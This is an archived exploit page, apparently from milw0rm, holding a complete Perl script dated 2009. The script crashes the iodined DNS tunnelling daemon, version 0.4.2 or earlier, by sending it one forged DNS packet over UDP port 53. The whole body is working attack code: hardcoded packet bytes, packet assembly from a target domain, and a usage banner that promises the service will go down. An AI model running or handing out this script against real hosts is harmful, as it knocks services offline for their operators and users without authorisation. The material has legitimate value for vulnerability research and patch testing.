<html><head><title>iodined <= 0.4.2-2 (forged DNS packet) Denial of Service Exploit</title></head><pre>#!/usr/bin/perl

# iodined &lt;= 0.4.2 DoS exploit
#
# by Albert Sellares &lt;whats[at]wekk[dot]net&gt; 
# http://www.wekk.net
# 2009-04-26
#
# This exploit shuts down the iodined daemon using a forged DNS packet.
# It works on the last debian stable version (0.4.2-2).
#
# It produces a segmentation fault on the daemon side.

use IO::Socket;
use strict;

my $pkt_header = &quot;\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x0b\x56\x63\x61\x61\x61\x69\x61\x71\x61\x61\x64&quot;;
my $pkt_footer = &quot;\x00\x00\x0a\x00\x01\x00\x00\x29\x10\x00\x00\x00\x80\x00\x00\x00&quot;;

if ($#ARGV != 1) {
    print &quot;shoot-iodined &lt;= 0.4.2 - &lt;whats[\@t]wekk.net&gt;\n&quot;.
          &quot;=============================================\n&quot;.
          &quot;Usage: ./shoot-iodined host domain\n&quot;.
          &quot; * host: Host addr where iodined is listening\n&quot;.
          &quot; * domain: Domain that iodined is using\n&quot;;
    exit 1;
}

my $host = $ARGV[0];
my $domain = $ARGV[1];
my $template = 'a24';
my @pkt;;
my $l;

push(@pkt, $pkt_header);
my @chunk = split(/\./, $domain);

foreach (@chunk) {
    $l = length $_;
    $template = $template . 'Ca'. $l;
    push(@pkt, $l);
    push(@pkt, $_);
}
$template = $template . 'a16';
push(@pkt, $pkt_footer);

$| = 1;
print &quot; [*] Shooting iodined at host $host...\n&quot;;

my $sock = IO::Socket::INET-&gt;new(  Proto     =&gt; 'udp',
                                   PeerPort  =&gt; 53,
                                   PeerAddr  =&gt; $host) or die &quot;Creating socket: $!\n&quot;;

$sock-&gt;send(pack($template, @pkt)) or die &quot;send: $!&quot;;

print &quot; [*] If the domain was ok, now the service is down.\n&quot;;

# milw0rm.com [2009-04-27]</pre></html>